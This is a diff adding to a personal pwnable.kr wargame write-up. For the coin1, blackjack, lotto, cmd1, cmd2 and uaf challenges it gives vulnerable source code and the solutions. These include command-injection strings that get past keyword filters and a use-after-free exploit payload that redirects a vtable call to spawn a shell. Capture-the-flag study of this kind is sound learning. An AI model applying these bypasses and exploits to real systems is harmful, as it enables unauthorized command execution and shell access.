@@ -505,5 +505,250 @@ coin1
    [Server] Correct!
 
    - Ready? starting in 3 sec... -
-   
+
 N=676 C=10
+
+So, from an early look at this, I figure that I probably need to write a script to deal with this.
+
+My initial approach used a binary search to attempt to look for the coin, as in the example above. 
+
+The script that I used can be found under the name of root.py, which should be in the same folder this writeup is in. I also had to login to one of pwnable.kr's previous challenges and nc 0 9007 to it from there as my connection was too slow originally.
+
+Solution:
+ssh mistake@pwnable.kr -p2222 (any ssh to pwnable should be fine)
+cd /tmp/
+vim root.py
+Copy/Paste
+python root.py
+
+-----------------------------------------
+blackjack
+
+Solution:
+Just bet a negative amount of money and lose.
+
+-----------------------------------------
+lotto
+   
+   // calculate lotto score
+   int match = 0, j = 0;
+   for(i=0; i<6; i++){
+      for(j=0; j<6; j++){
+         if(lotto[i] == submit[j]){
+            match++;
+         }
+      }
+   }
+
+
+The nested for loop has problems. I just need to input a number with six of the same bytes and hope that one of the bytes is in the random number.
+
+In this case, I just repeatedly entered !!!!!! for my lotto input in the hopes that !(ASCII 33) would be one of the randomly chosen numbers. 
+
+Solution:
+!!!!!! (until it outputs flag)
+
+-----------------------------------------
+cmd1
+
+#include <stdio.h>
+#include <string.h>
+
+int filter(char* cmd){
+   int r=0;
+   r += strstr(cmd, "flag")!=0;
+   r += strstr(cmd, "sh")!=0;
+   r += strstr(cmd, "tmp")!=0;
+   return r;
+}
+int main(int argc, char* argv[], char** envp){
+   putenv("PATH=/fuckyouverymuch");
+   if(filter(argv[1])) return 0;
+   system( argv[1] );
+   return 0;
+}
+
+What's happening in this program is that filter is checking if the argument given has flag, sh, or tmp, in it. If it does, it immediately exits the program. This prevents us from just typing in something like "cat flag" for the argument.
+
+I messed around a bit before determining that since there is no /fuckyouverymuch directory, I would be better off just bypassing the filter. So I did 
+./cmd1 "/bin/cat f*" to find the flag.
+
+Solution:
+./cmd1 "/bin/cat f*"
+mommy now I get what PATH environment is for :)
+
+-----------------------------------------
+cmd2
+
+#include <stdio.h>
+#include <string.h>
+
+int filter(char* cmd){
+   int r=0;
+   r += strstr(cmd, "=")!=0;
+   r += strstr(cmd, "PATH")!=0;
+   r += strstr(cmd, "export")!=0;
+   r += strstr(cmd, "/")!=0;
+   r += strstr(cmd, "`")!=0;
+   r += strstr(cmd, "flag")!=0;
+   return r;
+}
+
+extern char** environ;
+void delete_env(){
+   char** p;
+   for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
+}
+
+int main(int argc, char* argv[], char** envp){
+   delete_env();
+   putenv("PATH=/no_command_execution_until_you_become_a_hacker");
+   if(filter(argv[1])) return 0;
+   printf("%s\n", argv[1]);
+   system( argv[1] );
+   return 0;
+}
+
+So, this isn't something I found out on my own, but if you change directory to the topmost parent and call pwd, pwd just returns a /. 
+
+This actually makes the problem so much easier. I just did what you normally do when you try to cat a flag in a folder and replaced the slashes with \$(pwd).
+
+/bin/cat /home/cmd2/f* (I use f* b/c I can't type flag b/c of the filter)
+
+So I would use \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)f*. (don't forget the two cd ..; statements to access the topmost parent).
+
+Solution:
+./cmd2 "cd ..; cd ..; \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)f*"
+
+-----------------------------------------
+uaf -- go over this again, you're (me) rusty as hell
+
+#include <fcntl.h>
+#include <iostream> 
+#include <cstring>
+#include <cstdlib>
+#include <unistd.h>
+using namespace std;
+
+class Human{
+private:
+   virtual void give_shell(){
+      system("/bin/sh");
+   }
+protected:
+   int age;
+   string name;
+public:
+   virtual void introduce(){
+      cout << "My name is " << name << endl;
+      cout << "I am " << age << " years old" << endl;
+   }
+};
+
+class Man: public Human{
+public:
+   Man(string name, int age){
+      this->name = name;
+      this->age = age;
+        }
+        virtual void introduce(){
+      Human::introduce();
+                cout << "I am a nice guy!" << endl;
+        }
+};
+
+class Woman: public Human{
+public:
+        Woman(string name, int age){
+                this->name = name;
+                this->age = age;
+        }
+        virtual void introduce(){
+                Human::introduce();
+                cout << "I am a cute girl!" << endl;
+        }
+};
+
+int main(int argc, char* argv[]){
+   Human* m = new Man("Jack", 25);
+   Human* w = new Woman("Jill", 21);
+
+   size_t len;
+   char* data;
+   unsigned int op;
+   while(1){
+      cout << "1. use\n2. after\n3. free\n";
+      cin >> op;
+
+      switch(op){
+         case 1:
+            m->introduce();
+            w->introduce();
+            break;
+         case 2:
+            len = atoi(argv[1]);
+            data = new char[len];
+            read(open(argv[2], O_RDONLY), data, len);
+            cout << "your data is allocated" << endl;
+            break;
+         case 3:
+            delete m;
+            delete w;
+            break;
+         default:
+            break;
+      }
+   }
+
+   return 0;   
+}
+
+OK, so I needed a little help with this one. After a lot of experimentation and help from Google, I was able to actually decently figure what was going on. It's these few lines in GDB (if you disassemble the main function) that are the trick to solving the problem:
+
+   0x0000000000400fcd <+265>: mov    rax,QWORD PTR [rbp-0x38]
+   0x0000000000400fd1 <+269>: mov    rax,QWORD PTR [rax]
+   0x0000000000400fd4 <+272>: add    rax,0x8
+=> 0x0000000000400fd8 <+276>: mov    rdx,QWORD PTR [rax]
+   0x0000000000400fdb <+279>: mov    rax,QWORD PTR [rbp-0x38]
+   0x0000000000400fdf <+283>: mov    rdi,rax
+   0x0000000000400fe2 <+286>: call   rdx
+
+But the problem is getting your saved data value into $rbp-0x38. So I had to experiment with the order of 1, 2, and 3 commands. I know that 3 comes before 1 (so I can abuse the uaf bug), but I don't know how 3 or 2 relate. So I ran GDB multiple times, testing registers before I realized that 3 must be called first, and 2 must be then called twice or more. For some reason one 2 call wasn't enough... I'm assuming that the data needed to be stacked to a certain point on the memory, and one call asn't enough to do that.
+
+So I had to call the program in 3, 2, 2, 1.
+
+The data I input would also then be put into $rbp-0x38, which then according to the assembly, (*rbp-0x38 + 8) would be called by the program. So I obviously want to call the give_shell function in the code, which when examined in the readelf output reveals the vtable to be at 0x401560, and give_shell to beat 0x40117a.
+
+root@kali:~/Downloads# readelf uaf -a | grep Man | c++filt
+    57: 00000000004015d0    24 OBJECT  WEAK   DEFAULT   15 typeinfo for Man
+    78: 00000000004015c8     5 OBJECT  WEAK   DEFAULT   15 typeinfo name for Man
+    83: 0000000000401560    32 OBJECT  WEAK   DEFAULT   15 vtable for Man
+    94: 0000000000401264   109 FUNC    WEAK   DEFAULT   13 Man::Man(std::basic_string<char, std::char_traits<char>, std::allocator<char> >, int)
+   100: 0000000000401264   109 FUNC    WEAK   DEFAULT   13 Man::Man(std::basic_string<char, std::char_traits<char>, std::allocator<char> >, int)
+   110: 00000000004012d2    54 FUNC    WEAK   DEFAULT   13 Man::introduce()
+
+root@kali:~/Downloads# readelf uaf -a | grep give_shell | c++filt
+    85: 000000000040117a    24 FUNC    WEAK   DEFAULT   13 Human::give_shell()
+
+A little looking in GDB reveals that the give_shell value is stored in 0x401570, or vtable+16.
+
+gdb-peda$ x/10x 0x401560
+0x401560 <_ZTV3Man>: 0x00000000  0x00000000  0x004015d0  0x00000000
+0x401570 <_ZTV3Man+16>: 0x0040117a  0x00000000  0x004012d2  0x00000000
+0x401580 <_ZTV5Human>:  0x00000000  0x00000000
+
+So since the program calls (*rbp-0x38 + 8), I need to subtract 8 from 0x401570 to get 0x401568 as my input.
+
+Solution:
+(python -c 'print "\x68\x15\x40\x00" + "\x00" * 4') > /tmp/test
+./uaf 8 /tmp/test (8 is just the size of a byte)
+3
+2
+2
+1
+
+Tips I learned: set print asm-demangle on (C++, makes things legible)
+                use readelf when unable to find function locations
+                (readelf -a uaf | grep Man | c++filt in this case)
+                scp -P2222 uaf@pwnable.kr:uaf /root/Downloads to copy from pwnable.kr
+
